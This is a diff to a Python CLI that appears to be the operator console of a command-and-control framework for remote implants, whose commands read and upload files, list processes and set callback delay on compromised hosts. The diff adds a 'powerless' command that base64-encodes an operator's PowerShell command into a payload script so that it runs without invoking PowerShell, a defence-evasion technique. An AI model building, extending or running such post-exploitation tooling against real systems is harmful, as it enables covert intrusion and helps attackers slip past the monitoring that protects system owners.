@@ -30,6 +30,7 @@ class Cli:
         self.shell_cmds["refresh"] = self.refresh
         self.shell_cmds["exec"] = self.exec_code
         self.shell_cmds["ps"] = self.ps
+        self.shell_cmds["powerless"] = self.powerless
 
         self.config = config
         self.db = self.config.get("redis")
@@ -191,6 +192,7 @@ class Cli:
         print "\tread          args (remote path)        Read a file on the remote host"
         print "\tupload        args (path/url, path)     Upload a file on the remote system"
         print "\tps                                      List processes"
+        print "\tpowerless     args (powershell)         Execute Powershell command without invoking Powershell"
         print "\tdelay         args (milliseconds)       Update the callback delay"
         print "\thelp                                    Show this help menu"
         Alias.list_alias()
@@ -278,6 +280,17 @@ class Cli:
         else:
             UI.error("Cannot fetch the resource")
             return data
+
+    def powerless(self, data):
+        try:
+            cmd, ps_cmd = data.split(" ", 1)
+        except:
+            UI.error("Missing arguments")
+            return ";"
+               
+        ps = Utils.load_powershell_script("powerless.ps1", 22)
+        ps = Utils.update_key(ps, "PAYLOAD", base64.b64encode(ps_cmd))
+        return ps
     
     def ps(self, data):
         ps = Utils.load_powershell_script("ps.ps1", 0)
